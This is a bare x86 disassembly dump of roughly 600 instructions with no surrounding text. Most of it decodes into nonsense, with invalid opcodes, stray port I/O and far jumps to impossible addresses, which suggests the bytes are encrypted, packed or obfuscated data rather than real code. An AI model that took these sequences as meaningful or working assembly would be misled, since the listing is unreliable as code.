  412498:	rol    ebp,cl
  41249a:	sbb    BYTE PTR ds:0x6e4e902e,0x48
  4124a1:	mov    ebp,0xd1c20d4c
  4124a6:	mov    cl,0xcf
  4124a8:	jmp    0xe496ae8e
  4124ad:	jmp    0x412735
  4124b2:	iret   
  4124b3:	ret    
  4124b4:	rol    esi,0xd1
  4124b7:	(bad)  
  4124b8:	fcmovnu st,st(1)
  4124ba:	mov    ebx,0xf81ebe60
  4124bf:	cmp    al,0x6c
  4124c2:	cmp    eax,0xe578786e
  4124c7:	jle    0x412541
  4124c9:	js     0x41245d
  4124cb:	mov    dl,dh
  4124cd:	mov    DWORD PTR [ecx+0x6ba7597e],esi
  4124d3:	inc    esp
  4124d4:	aas    
  4124d5:	jnp    0x4124c8
  4124d7:	jo     0x41245a
  4124d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4124da:	jae    0x412525
  4124dc:	xor    DWORD PTR [esi],eax
  4124de:	out    dx,al
  4124df:	inc    ebp
  4124e0:	outs   dx,DWORD PTR ds:[esi]
  4124e1:	shl    BYTE PTR ss:[ebp+ebp*4-0x118f7233],1
  4124e9:	(bad)  
  4124ea:	jbe    0x412503
  4124ec:	inc    ebp
  4124ed:	push   cs
  4124ee:	inc    edi
  4124ef:	pop    esi
  4124f0:	ss mov cl,0x87
  4124f3:	out    dx,al
  4124f4:	int    0xfa
  4124f6:	push   es
  4124f7:	sbb    eax,0x5f38ba44
  4124fc:	mov    al,ds:0xbdb3821a
  412501:	push   ebp
  412502:	addr16 (bad) 
  412504:	xchg   edx,eax
  412505:	das    
  412506:	push   esi
  412507:	(bad)  
  412508:	imul   DWORD PTR [edi+0x7e1571c7]
  41250e:	dec    edi
  41250f:	mov    eax,ds:0x35a2f66c
  412514:	pop    ds
  412515:	lahf   
  412516:	xchg   ebx,eax
  412517:	adc    DWORD PTR [ebp+0x2ffb58b4],0x0
  41251e:	popf   
  41251f:	bound  ebx,QWORD PTR [esi]
  412521:	cdq    
  412522:	addr16 and eax,0xe6e563f6
  412528:	stc    
  412529:	adc    ecx,DWORD PTR [ebx]
  41252b:	icebp  
  41252c:	retf   
  41252d:	clc    
  41252e:	imul   esp,DWORD PTR [ebx+0x377885d7],0xa1ed169d
  412538:	rol    DWORD PTR [edx],1
  41253a:	imul   ecx,DWORD PTR [ebx-0x10d5690],0x79
  412541:	(bad)  
  412542:	or     dl,BYTE PTR [edx]
  412544:	mov    ebx,esi
  412546:	xchg   edi,eax
  412547:	and    esp,ebx
  412549:	(bad)  
  41254a:	out    0x73,eax
  41254c:	iret   
  41254d:	add    BYTE PTR [ebx+0x1412f334],0xe4
  412554:	add    BYTE PTR [edi-0x25020114],ah
  41255a:	cmc    
  41255b:	imul   esp,DWORD PTR [eax-0xb9a833f],0x3e
  412562:	push   0x13f10989
  412567:	mov    bl,0x6e
  412569:	fnstenv [eax+eax*4]
  41256c:	pop    ds
  41256d:	mov    bl,0x6
  41256f:	not    DWORD PTR [edi+0x6d]
  412572:	mov    ah,0x6d
  412574:	xchg   ecx,eax
  412575:	(bad)  
  412576:	jmp    0x86e0:0x66cafa7d
  41257d:	mov    bh,0xe8
  41257f:	stos   DWORD PTR es:[edi],eax
  412580:	mov    ah,0x72
  412582:	stc    
  412583:	xchg   esi,eax
  412584:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412585:	test   bh,bh
  412587:	mov    esp,0x93193864
  41258c:	mov    WORD PTR [edx+ebx*4],cs
  41258f:	lods   eax,DWORD PTR ds:[esi]
  412590:	adc    eax,0xc3dc2cc7
  412595:	pushf  
  412596:	inc    eax
  412597:	adc    DWORD PTR [esi],esi
  412599:	xchg   ebx,eax
  41259a:	and    bh,BYTE PTR [ebp-0x54]
  41259d:	dec    eax
  41259e:	ds pop edx
  4125a0:	dec    esi
  4125a1:	call   0x6c16:0x8c4e54b8
  4125a8:	mov    cl,0x89
  4125aa:	shr    BYTE PTR [edi+0x4ee50de],0xe6
  4125b1:	dec    esi
  4125b2:	jl     0x41257b
  4125b4:	repnz mov eax,ds:0x6ff6ae55
  4125ba:	adc    bh,BYTE PTR [eax-0x50]
  4125bd:	lea    esp,[ecx]
  4125bf:	jmp    0x412608
  4125c1:	loopne 0x412609
  4125c3:	shr    BYTE PTR [ebx+esi*4+0x48],1
  4125c7:	(bad)  
  4125c8:	dec    esi
  4125c9:	mov    ch,0xd4
  4125cb:	mov    esi,DWORD PTR [ebx+0x33de3b39]
  4125d1:	or     esp,eax
  4125d3:	(bad)  
  4125d4:	adc    eax,0x5effe93f
  4125d9:	lods   eax,DWORD PTR ds:[esi]
  4125da:	std    
  4125db:	ss xchg edx,eax
  4125dd:	jnp    0x41259a
  4125df:	inc    edx
  4125e0:	dec    edi
  4125e1:	push   edx
  4125e2:	lods   al,BYTE PTR ds:[esi]
  4125e3:	dec    esi
  4125e4:	retf   0x2780
  4125e7:	push   edx
  4125e8:	mov    dl,0x2c
  4125ea:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  4125ec:	enter  0xdd34,0xfb
  4125f0:	in     eax,dx
  4125f1:	jo     0x412581
  4125f3:	cwde   
  4125f4:	dec    ebp
  4125f5:	inc    esi
  4125f6:	pop    ss
  4125f7:	je     0x41260c
  4125f9:	inc    esi
  4125fa:	fdivr  QWORD PTR [eax-0x61]
  4125fd:	sbb    BYTE PTR [esi],bl
  4125ff:	stos   BYTE PTR es:[edi],al
  412600:	push   0xffffffbe
  412602:	dec    edi
  412603:	mov    ecx,0x751d481b
  412608:	jns    0x412637
  41260a:	inc    eax
  41260b:	xor    bh,ch
  41260d:	and    al,0x3d
  41260f:	cmp    cl,BYTE PTR [edi-0x1c]
  412612:	mov    dh,0x35
  412614:	daa    
  412615:	das    
  412616:	fldcw  WORD PTR [eax+0x5ff7306d]
  41261c:	mov    ecx,0xb4f04134
  412621:	(bad)  
  412622:	jno    0x4125f2
  412624:	arpl   WORD PTR [edx-0x2ec915e1],sp
  41262a:	dec    edi
  41262b:	bound  eax,QWORD PTR [esi]
  41262d:	cmp    DWORD PTR ds:0xe6ae0f72,ebp
  412633:	jne    0x412654
  412635:	outs   dx,DWORD PTR ds:[esi]
  412636:	inc    eax
  412637:	(bad)  
  412638:	jb     0x4125d4
  41263a:	mov    edx,0xec24c59c
  41263f:	je     0x412675
  412641:	rol    BYTE PTR [ebp+0x2d13a0fa],cl
  412647:	(bad)  
  412648:	in     eax,0xed
  41264a:	test   BYTE PTR [ecx],0xc4
  41264d:	ret    0xf947
  412650:	out    dx,eax
  412651:	aad    0xa0
  412653:	(bad)  
  412654:	jae    0x41268b
  412656:	add    eax,0xd298f740
  41265b:	aad    0x97
  41265d:	call   DWORD PTR [ebx*8-0x4d37daa3]
  412664:	stc    
  412665:	push   esi
  412666:	inc    ecx
  412667:	mov    edx,0xe503469b
  41266c:	xchg   edi,eax
  41266d:	mov    al,0x9e
  41266f:	dec    esp
  412670:	push   edi
  412671:	(bad)  
  412672:	fsub   QWORD PTR [esi]
  412674:	mov    eax,0xfda91794
  412679:	fidivr DWORD PTR [ebx]
  41267b:	retf   0x12dd
  41267e:	xchg   esp,eax
  41267f:	iret   
  412680:	adc    esp,edx
  412682:	ret    0x98c0
  412685:	les    ebx,FWORD PTR [edi+0x1d36313b]
  41268b:	or     eax,0x96e22dcc
  412690:	push   0x35c6f50a
  412695:	fisub  DWORD PTR [ebx+0x44275444]
  41269b:	stc    
  41269c:	aam    0x41
  41269e:	idiv   BYTE PTR [edi+edx*1+0x6e]
  4126a2:	sbb    ebp,esp
  4126a4:	js     0x412694
  4126a6:	(bad)  
  4126a8:	xchg   edi,eax
  4126a9:	dec    ebx
  4126aa:	imul   esi,DWORD PTR [eiz*1+0x62bb9d24],0x8b17f0f5
  4126b5:	cmp    dh,al
  4126b7:	mov    WORD PTR [esi-0x2b70fe0f],gs
  4126bd:	in     al,0x45
  4126bf:	adc    DWORD PTR [ebp+0x50],ecx
  4126c2:	fcmovbe st,st(5)
  4126c4:	pop    ds
  4126c5:	and    eax,0xa2368075
  4126ca:	rcl    eax,1
  4126cc:	ret    
  4126cd:	inc    eax
  4126ce:	pop    esi
  4126cf:	push   0xc0d1ffd3
  4126d4:	mov    ds:0xb575bdb,al
  4126d9:	mov    dl,0x10
  4126db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4126dc:	mov    eax,0xb2e62fb1
  4126e1:	inc    edx
  4126e2:	test   ebp,edi
  4126e4:	pop    ss
  4126e5:	loope  0x412723
  4126e7:	dec    edx
  4126e8:	mov    edi,0xb11dc68e
  4126ed:	shl    BYTE PTR [ebx-0x797ef542],cl
  4126f3:	inc    esp
  4126f4:	leave  
  4126f5:	mov    dl,0xd8
  4126f7:	(bad)  [ebx+eax*1]
  4126fa:	inc    esi
  4126fb:	mov    ch,0x65
  4126fd:	jns    0x4126c7
  4126ff:	push   0xffffffe6
  412701:	sub    BYTE PTR [ecx+0x304c7fb7],bl
  412707:	xlat   BYTE PTR ds:[ebx]
  412708:	mov    edx,eax
  41270a:	push   esi
  41270b:	or     eax,ecx
  41270d:	outs   dx,DWORD PTR ds:[esi]
  41270e:	xor    DWORD PTR [ebp-0x63],edx
  412711:	sti    
  412712:	daa    
  412713:	aas    
  412714:	aad    0xd5
  412716:	push   esi
  412717:	inc    esi
  412718:	inc    edi
  412719:	retf   
  41271a:	xor    eax,0xc5dfa011
  41271f:	push   ebp
  412720:	inc    esp
  412721:	lods   eax,DWORD PTR ds:[esi]
  412722:	pop    edx
  412723:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412724:	mov    edx,0x6d7cde3b
  412729:	jno    0x412738
  41272b:	or     BYTE PTR [edi-0x1e],bh
  41272e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41272f:	shl    BYTE PTR [ebp+0x11],0xad
  412733:	je     0x412710
  412735:	mov    DWORD PTR [ebp-0xc],0xf89c8539
  41273c:	mov    DWORD PTR [ebp-0x44],0xf89c853a
  412743:	jmp    0x4129cb
  412748:	int    0xcb
  41274a:	ror    esp,0xd9
  41274d:	fcmove st,st(5)
  41274f:	leave  
  412750:	sub    al,0xaa
  412752:	(bad)  
  412754:	jne    0x412730
  412756:	leave  
  412757:	bound  ebp,QWORD PTR [edx-0x1a878794]
  41275d:	jle    0x4127d7
  41275f:	js     0x4127bc
  412761:	cmp    al,0xe3
  412763:	and    esi,edx
  412765:	lahf   
  412766:	xchg   esi,eax
  412767:	sbb    bl,BYTE PTR [ebx+ebp*1+0x51d0365d]
  41276e:	(bad)  
  41276f:	mov    esp,0x2ba86514
  412774:	leave  
  412775:	retf   
  412776:	icebp  
  412777:	les    esp,FWORD PTR [eax+0x38]
  41277a:	in     al,dx
  41277b:	inc    edx
  41277c:	mov    bh,0xad
  41277e:	mov    edi,0xb143ec4f
  412783:	xor    ah,bh
  412785:	ficomp WORD PTR [ebx+0x69a7d715]
  41278b:	popf   
  41278c:	jno    0x412740
  41278e:	jle    0x4127df
  412790:	mov    cl,0x5a
  412792:	int    0x5e
  412794:	xchg   esp,eax
  412795:	adc    eax,0x9674c4fa
  41279a:	into   
  41279b:	jge    0x412800
  41279d:	mov    eax,ds:0x11309e46
  4127a2:	xor    al,0xed
  4127a4:	push   ecx
  4127a5:	(bad)  
  4127a6:	pop    ebp
  4127a7:	push   es
  4127a8:	mov    bh,0x6c
  4127aa:	inc    ebx
  4127ab:	dec    ebx
  4127ac:	pop    ebx
  4127ad:	and    DWORD PTR [ebx-0x4a],edx
  4127b0:	jg     0x41277d
  4127b2:	push   ecx
  4127b3:	push   0xd63b388d
  4127b8:	jecxz  0x4127af
  4127ba:	test   eax,0x650082d0
  4127bf:	adc    ebp,eax
  4127c1:	loopne 0x412798
  4127c3:	xchg   esi,eax
  4127c4:	inc    eax
  4127c5:	xor    eax,0x907a1883
  4127ca:	push   ecx
  4127cb:	repz int3 
  4127cd:	bound  eax,QWORD PTR [edx+0x8f6a12a]
  4127d3:	rcr    ch,0xe6
  4127d6:	dec    edx
  4127d7:	dec    esp
  4127d8:	aaa    
  4127d9:	push   ecx
  4127da:	pop    esp
  4127db:	sub    DWORD PTR [ecx+0x1f79b098],ebp
  4127e1:	popa   
  4127e2:	add    al,0xcd
  4127e4:	lea    esi,[eax+0x597ab14f]
  4127ea:	and    eax,0x5a4cfe73
  4127ef:	xchg   esp,eax
  4127f0:	add    dl,BYTE PTR [esp+edi*4]
  4127f3:	cwde   
  4127f4:	jecxz  0x41283e
  4127f6:	(bad)  
  4127f7:	clc    
  4127f8:	dec    edi
  4127f9:	adc    ecx,eax
  4127fb:	cwde   
  4127fc:	gs pop ss
  4127fe:	mov    ebx,0x6a84e58a
  412803:	int3   
  412804:	leave  
  412805:	inc    ebx
  412806:	xchg   BYTE PTR [ebx+0x29],bl
  412809:	jbe    0x412793
  41280b:	inc    edx
  41280c:	das    
  41280d:	lods   al,BYTE PTR ds:[esi]
  41280e:	mov    ecx,DWORD PTR ds:0x3656cc8c
  412814:	ret    0x2163
  412817:	ins    BYTE PTR es:[edi],dx
  412818:	in     eax,0x61
  41281a:	in     eax,dx
  41281b:	dec    ebx
  41281c:	scas   al,BYTE PTR es:[edi]
  41281d:	add    esi,esi
  41281f:	test   BYTE PTR [ecx],bl
  412821:	dec    edx
  412822:	xor    eax,0xfee5943d
  412827:	cmp    eax,0x79920c36
  41282c:	test   ecx,esp
  41282e:	pop    ds
  41282f:	ds mov bl,0x6a
  412832:	or     ch,0x14
  412835:	and    bh,BYTE PTR [esi-0x2bbb092b]
  41283b:	rcl    BYTE PTR [esi],0x56
  41283e:	inc    ebp
  41283f:	xor    esi,DWORD PTR [edx]
  412841:	mov    dh,0x6f
  412843:	add    eax,0xe23c9a45
  412848:	jbe    0x4128a9
  41284a:	jp     0x412846
  41284c:	xor    DWORD PTR ds:0xbe9c9a59,edx
  412852:	bound  edi,QWORD PTR [ebp-0x7c63273a]
  412858:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412859:	cmp    BYTE PTR [esi-0x6674676c],dl
  41285f:	fisubr DWORD PTR [edi]
  412861:	jne    0x412801
  412863:	push   0xf
  412865:	push   0xeb84952d
  41286a:	(bad)  
  41286b:	push   ds
  41286c:	hlt    
  41286d:	adc    al,0x9d
  41286f:	adc    BYTE PTR [ebp+edi*1-0x4],al
  412873:	adc    al,0x17
  412875:	push   ss
  412876:	cmp    DWORD PTR ds:0x5d22c0b1,edx
  41287c:	into   
  41287d:	add    esp,edx
  41287f:	lock inc ebx
  412881:	fstp   DWORD PTR [edi-0x30c55915]
  412887:	lods   al,BYTE PTR ds:[esi]
  412888:	mov    dl,BYTE PTR [ecx]
  41288a:	ja     0x412893
  41288c:	ficom  DWORD PTR [ebp-0x2b9e58f8]
  412892:	push   es
  412893:	ror    BYTE PTR [eax+ebx*1+0x3c],cl
  412897:	or     ebp,edx
  412899:	mov    WORD PTR [ecx+0x7b],?
  41289c:	popa   
  41289d:	add    DWORD PTR [ebx-0x73],esp
  4128a0:	mov    ecx,0x70714fcc
  4128a5:	lds    eax,FWORD PTR [ecx+edi*2-0x6e]
  4128a9:	pmullw mm0,QWORD PTR [edx+0x34604070]
  4128b0:	xchg   ecx,eax
  4128b1:	dec    ebx
  4128b2:	push   edi
  4128b3:	mov    ch,0x96
  4128b5:	out    0xd5,al
  4128b7:	cmp    edx,esp
  4128b9:	xchg   edx,eax
  4128ba:	adc    DWORD PTR [edi+0x8],ebx
  4128bd:	pop    esp
  4128be:	cmp    DWORD PTR [ecx],esp
  4128c0:	add    DWORD PTR [ebp+eiz*8+0x6e4d4bc6],ebx
  4128c7:	test   al,0x15
  4128c9:	mov    DWORD PTR [eax-0x2c],ebp
  4128cc:	sbb    BYTE PTR [ecx],ah
  4128ce:	mov    al,ds:0xac0b9622
  4128d3:	adc    BYTE PTR [edi],al
  4128d5:	int3   
  4128d6:	pop    ebp
  4128d7:	mov    edx,DWORD PTR [esi]
  4128d9:	mov    eax,0xeb850171
  4128de:	aas    
  4128df:	xchg   ebp,eax
  4128e0:	mov    ch,0x3b
  4128e2:	sbb    bl,ch
  4128e4:	popf   
  4128e5:	or     cl,bh
  4128e7:	mov    bl,ch
  4128e9:	aaa    
  4128ea:	jns    0x4128aa
  4128ec:	fistp  QWORD PTR [esi]
  4128ee:	mov    BYTE PTR [ebx-0x63],bh
  4128f1:	ja     0x41290c
  4128f3:	push   cs
  4128f4:	(bad)  
  4128f5:	push   0x19
  4128f7:	sbb    eax,0xd9ae022d
  4128fc:	shl    BYTE PTR [ebp-0x24],0x4f
  412900:	xchg   edi,eax
  412901:	popa   
  412902:	inc    edx
  412903:	(bad)  
  412904:	and    eax,0xd606b3e8
  412909:	jb     0x41297b
  41290b:	pop    esp
  41290c:	pusha  
  41290d:	cmc    
  41290e:	test   DWORD PTR [edx+edi*8],ebp
  412911:	mov    ah,0x49
  412913:	pop    ebx
  412914:	dec    edx
  412915:	add    eax,0x969da719
  41291a:	xchg   BYTE PTR [esi+0x48],al
  41291d:	pop    esi
  41291e:	or     ch,BYTE PTR [ebx+0x7c19ba9b]
  412924:	mov    ecx,0xd147fdee
  412929:	loope  0x412926
  41292b:	cmp    DWORD PTR [edx-0x46],ebp
  41292e:	cmp    eax,0x4da1331c
  412933:	adc    edi,esp
  412935:	xlat   BYTE PTR ds:[ebx]
  412936:	push   edi
  412937:	mov    ds:0x36eff7d2,al
  41293c:	jb     0x412993
  41293e:	mov    al,0x1
  412940:	data16 das 
  412942:	stos   BYTE PTR es:[edi],al
  412943:	or     eax,DWORD PTR [edi-0x17657240]
  412949:	and    eax,0xa133e758
  41294e:	add    al,bh
  412950:	xor    BYTE PTR [ebx],bl
  412952:	mov    ch,0x5
  412954:	repz jno 0x4128dc
  412957:	mov    ds:0xd8ce788d,al
  41295c:	ret    0x3a6a
  41295f:	js     0x412907
  412961:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412962:	retf   
  412963:	(bad)  
  412964:	int3   
  412965:	dec    edi
  412966:	xchg   esp,eax
  412967:	outs   dx,DWORD PTR ds:[esi]
  412968:	pop    ebp
  412969:	out    0x50,al
  41296b:	pop    edi
  41296c:	push   0xa956ac3b
  412971:	enter  0xb069,0xa0
  412975:	jmp    0x241894b9
  41297a:	enter  0xfdcd,0xc2
  41297e:	out    dx,al
  41297f:	sub    ebp,DWORD PTR [edx-0x7f]
  412982:	push   0xffffffac
  412984:	fst    QWORD PTR [esi-0x6c]
  412987:	adc    eax,0xbd334138
  41298c:	test   eax,0xa0a8eea8
  412991:	adc    eax,DWORD PTR [ebx+0x33]
  412994:	or     al,0x4b
  412996:	outs   dx,DWORD PTR ds:[esi]
  412997:	loop   0x412921
  412999:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41299a:	xlat   BYTE PTR ds:[ebx]
  41299b:	dec    ebx
  41299c:	sub    al,0x94
  41299e:	mov    ch,0x56
  4129a0:	retf   
  4129a1:	or     edx,eax
  4129a3:	xor    eax,0x97f0799a
  4129a8:	adc    bh,BYTE PTR [esi+eiz*8-0x6f]
  4129ac:	mov    esp,0xcc3565e5
  4129b1:	mov    es,WORD PTR [edi]
  4129b3:	pop    ebx
  4129b4:	xchg   edx,eax
  4129b5:	outs   dx,BYTE PTR ds:[esi]
  4129b6:	adc    eax,DWORD PTR [edi+0x32cf0588]
  4129bc:	ds sbb eax,0x1b3a23c6
  4129c2:	aam    0x9
  4129c4:	mul    DWORD PTR [edi]
  4129c6:	(bad)
  4129ca:	and    ecx,DWORD PTR [ebx-0x2fcc17ab]
  4129d0:	add    edx,ecx
  4129d2:	jmp    0x41396f
  4129d7:	mov    edx,DWORD PTR [ebp-0x18]
  4129da:	xor    edx,eax
  4129dc:	add    edx,DWORD PTR [ebp-0x14]
  4129df:	jmp    0x412c67
  4129e4:	(bad)
  4129e7:	ret    0xc1ca
  4129ea:	(bad)
  4129ed:	xlat   BYTE PTR ds:[ebx]
  4129ee:	data16 ja 0x412989
  4129f1:	in     eax,dx
  4129f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4129f3:	pop    edi
  4129f4:	pop    ss
  4129f5:	jno    0x412a6f
  4129f7:	js     0x4129de
  4129f9:	jle    0x412a73
  4129fb:	js     0x412a2e
  4129fd:	mov    eax,ds:0x747c9ec
  412a02:	nop
  412a03:	repnz sub DWORD PTR [ecx-0x45d0afda],eax
  412a0a:	outs   dx,BYTE PTR ds:[esi]
  412a0b:	and    bh,BYTE PTR [edi-0x53]
  412a0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a0f:	sub    esi,DWORD PTR [ebp+0x3f]
  412a12:	jnp    0x4129e1
  412a14:	sti    
  412a15:	in     eax,dx
  412a16:	pop    ebp
  412a17:	ss ds icebp 
  412a1a:	dec    ecx
  412a1b:	and    al,0x88
  412a1d:	mov    DWORD PTR [esi],ecx
  412a1f:	sbb    al,0x3c
  412a21:	fcmovnbe st,st(1)
  412a23:	inc    di
  412a25:	lea    ebp,[edi]
  412a27:	xchg   esi,eax
  412a28:	stc    
  412a29:	mov    eax,0xb8025d1d
  412a2e:	add    edi,DWORD PTR [ebp+0x6df697ea]
  412a34:	push   esp
  412a35:	xchg   BYTE PTR ds:0x24ce569d,ch
  412a3b:	out    dx,al
  412a3c:	leave  
  412a3d:	cmp    al,0xd3
  412a3f:	push   ebx
  412a40:	les    ebp,FWORD PTR [ebx-0x77]
  412a43:	jae    0x412a2a
  412a45:	xchg   DWORD PTR [eax+ebp*4+0x73],ecx
  412a49:	iret   
  412a4a:	inc    esp
  412a4b:	add    al,0xd1
  412a4d:	xlat   BYTE PTR ds:[ebx]
  412a4e:	or     eax,0x4c63aa20
  412a53:	or     cl,BYTE PTR [ebx-0x6b]
  412a56:	(bad)  
  412a57:	ins    BYTE PTR es:[edi],dx
  412a58:	div    DWORD PTR [esi-0x7d]
  412a5b:	retf   
  412a5c:	adc    al,0x25
  412a5e:	mov    ecx,0xd02d2ba0
  412a63:	and    eax,0xffa23fa7
  412a68:	loope  0x412a82
  412a6a:	or     DWORD PTR [ebx+eiz*2],esi
  412a6d:	fwait
  412a6e:	mov    edi,ebp
  412a70:	mov    ds:0x8c50e4cd,eax
  412a75:	pop    esp
  412a76:	mov    esi,0x83904be2
  412a7b:	out    dx,al
  412a7c:	sub    cl,dl
  412a7e:	pop    esp
  412a7f:	scas   eax,DWORD PTR es:[edi]
  412a80:	ss cs pushf 
  412a83:	xchg   ecx,eax
  412a84:	jnp    0x412a6f
  412a86:	(bad)  [edx+0x7e]
  412a89:	and    edi,ecx
  412a8b:	add    al,bh
  412a8d:	in     al,dx
  412a8e:	mov    ecx,0x7da58aa9
  412a93:	(bad)  
  412a94:	in     eax,dx
  412a95:	mov    cs,WORD PTR [ecx+edx*8-0x59]
  412a99:	jae    0x412a33
  412a9b:	adc    DWORD PTR [ecx],esi
  412a9d:	push   esi
  412a9e:	jbe    0x412ab6
  412aa0:	mov    ch,0x68
  412aa2:	scas   eax,DWORD PTR es:[edi]
  412aa3:	aas    
  412aa4:	adc    BYTE PTR [eax+0x2255eba3],dh
  412aaa:	inc    edi
  412aab:	jb     0x412b08
  412aad:	out    0x54,eax
  412aaf:	test   eax,ecx
  412ab1:	mov    eax,0xe768e34b
  412ab6:	test   DWORD PTR [eax+esi*1+0x17],esi
  412aba:	imul   edx,DWORD PTR [edi],0x889ae582
  412ac0:	push   0xc
  412ac2:	int3   
  412ac3:	test   DWORD PTR [esi+edi*8+0x16a6b5a3],edx
  412aca:	aad    0xd4
  412acc:	call   0x3ea84059
  412ad1:	add    DWORD PTR [esi+0x1e19afc3],ebp
  412ad7:	dec    ebp
  412ad8:	inc    edx
  412ad9:	cmp    eax,0x181945c9
  412ade:	aad    0xc1
  412ae0:	mov    al,0x48
  412ae2:	call   0xd878e9ea
  412ae7:	das    
  412ae8:	add    DWORD PTR [ecx-0x4b42cf00],edi
  412aee:	dec    edx
  412aef:	stc    
  412af0:	out    0x61,al
  412af2:	das    
  412af3:	and    eax,0xbab1c2d2
  412af8:	or     DWORD PTR [ebx-0x79],esp
  412afb:	mov    ds:0x2f872169,al
  412b00:	jb     0x412b47
  412b02:	or     al,0x4e
  412b04:	pop    edx
  412b05:	lods   eax,DWORD PTR ds:[esi]
  412b06:	ins    BYTE PTR es:[edi],dx
  412b07:	push   ecx
  412b08:	add    eax,0x43f91da
  412b0d:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  412b0f:	rcr    DWORD PTR [ebp-0x21bad46d],cl
  412b15:	imul   edi,ebp,0xffffffb0
  412b18:	in     eax,dx
  412b19:	jb     0x412b0a
  412b1b:	aas    
  412b1c:	dec    esi
  412b1d:	push   esi
  412b1e:	lock mov eax,ds:0xafebe545
  412b24:	out    0x6b,al
  412b26:	mov    esp,DWORD PTR [ecx]
  412b28:	sub    eax,esi
  412b2a:	xor    BYTE PTR [edx+0x1f],ah
  412b2d:	sbb    eax,0x9741b002
  412b32:	leave  
  412b33:	or     al,0xdd
  412b35:	sahf   
  412b36:	int3   
  412b37:	dec    edi
  412b38:	inc    esi
  412b39:	push   esi
  412b3a:	leave  
  412b3b:	pop    esp
  412b3c:	ror    DWORD PTR [esi+ebp*2-0x2b7df46a],1
  412b43:	xchg   esi,eax
  412b44:	xor    eax,0x48f380f7
  412b49:	dec    esp
  412b4a:	ds enter 0x5e79,0x9a
  412b4f:	sub    BYTE PTR [ebx-0x1b7ec201],dl
  412b55:	ss int3 
  412b57:	fld    DWORD PTR [edx]
  412b59:	and    ebp,ebx
  412b5b:	xor    DWORD PTR [ecx],0xec224188
  412b61:	cs mov ah,0x58
  412b64:	adc    eax,0xfffb65fa
  412b69:	aaa    
  412b6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b6b:	mov    DWORD PTR ss:[edx+edi*8-0x7f891c01],ecx
  412b73:	jno    0x412aff
  412b75:	inc    esp
  412b76:	lds    ecx,FWORD PTR [ebp+0x11705249]
  412b7c:	(bad)  [ecx+0x65]
  412b7f:	add    eax,0xca58939b
  412b84:	mov    BYTE PTR [ecx-0x27],dl
  412b87:	leave  
  412b88:	ja     0x412b5c
  412b8a:	push   edx
  412b8b:	pop    edx
  412b8c:	jecxz  0x412b1b
  412b8e:	push   edi
  412b8f:	fmul   st,st(6)
  412b91:	retf   
  412b92:	add    dh,BYTE PTR [eax]
  412b94:	sub    al,0xcb
  412b96:	xchg   esp,eax
  412b97:	fild   QWORD PTR [eax-0x11]
  412b9a:	inc    ecx
  412b9b:	in     al,dx
  412b9c:	fldenv [esi]
  412b9e:	enter  0xc9ca,0xbb
  412ba2:	sub    dh,BYTE PTR [ebx+0x75]
  412ba5:	in     al,dx
  412ba6:	test   cl,dl
  412ba8:	or     ebp,DWORD PTR [esi+esi*1+0x20]
  412bac:	stos   BYTE PTR es:[edi],al
  412bad:	out    0xc4,al
  412baf:	(bad)  
  412bb0:	(bad)  
  412bb1:	push   ebp
  412bb2:	sbb    al,0xe8
  412bb4:	dec    ecx
  412bb5:	push   0x47
  412bb7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412bb8:	in     al,dx
  412bb9:	jle    0x412bc6
  412bbb:	jmp    0x64e:0x370aa053
  412bc2:	sub    al,0xa5
  412bc4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412bc5:	popa   
  412bc6:	push   ss
  412bc7:	clc    
  412bc8:	std    
  412bc9:	pop    edi
  412bca:	sub    BYTE PTR ds:[esi],ah
  412bcd:	add    bh,BYTE PTR [ebx+0xe]
  412bd0:	inc    edi
  412bd1:	ret    0x7f7a
  412bd4:	cmc    
  412bd5:	mov    ?,esi
  412bd7:	outs   dx,BYTE PTR ds:[esi]
  412bd8:	mov    al,ds:0x86bea5a9
  412bdd:	ins    BYTE PTR es:[edi],dx
  412bde:	mov    ebp,0x12f8e2cd
  412be3:	inc    edi
  412be4:	push   ecx
  412be5:	repz xor eax,0xb1577de2
  412beb:	div    DWORD PTR [ebp-0x3dc7df20]
  412bf1:	jae    0x412b73
  412bf3:	mov    ebp,0xb1041abc
  412bf8:	popf   
  412bf9:	lahf   
  412bfa:	dec    esp
  412bfb:	loop   0x412b92
  412bfd:	pop    es
  412bfe:	dec    esp
  412bff:	stos   DWORD PTR es:[edi],eax
  412c00:	and    DWORD PTR [ecx],ecx
  412c02:	daa    
  412c03:	fstp   TBYTE PTR [ebx+0x31b7f97e]
  412c09:	stos   BYTE PTR es:[edi],al
  412c0a:	cs je  0x412ba8
  412c0d:	inc    ecx
  412c0e:	ror    BYTE PTR [edi+0x76fc63fe],cl
  412c14:	jns    0x412bb8
  412c16:	sahf   
  412c17:	mov    WORD PTR [ebx+0x1f],ds
  412c1a:	hlt    
  412c1b:	mov    ebp,DWORD PTR [edi]
  412c1d:	call   0x8b63:0x18e7f07c
  412c24:	pushf  
  412c25:	xchg   edi,eax
  412c26:	mov    dh,0x6
  412c28:	in     eax,dx
  412c29:	jp     0x412c50
  412c2b:	out    0xf1,eax
  412c2d:	loope  0x412be4
  412c2f:	fsub   DWORD PTR [ebx+0x623c5996]
  412c35:	out    dx,eax
  412c36:	xchg   esi,eax
  412c37:	or     eax,DWORD PTR [edx]
  412c39:	xor    BYTE PTR [edx],0x9d
  412c3c:	jnp    0x412bd5
  412c3e:	jno    0x412c0c
  412c40:	push   ds
  412c41:	mov    WORD PTR [esi-0x63928b2c],es
  412c47:	pop    edi
  412c48:	into   
  412c49:	push   edx
  412c4a:	mov    eax,0xfe736802
  412c4f:	jae    0x412c2a
  412c51:	inc    esi
  412c52:	dec    edi
  412c53:	repnz dec edi
  412c55:	ret    0x5d97
  412c58:	dec    edi
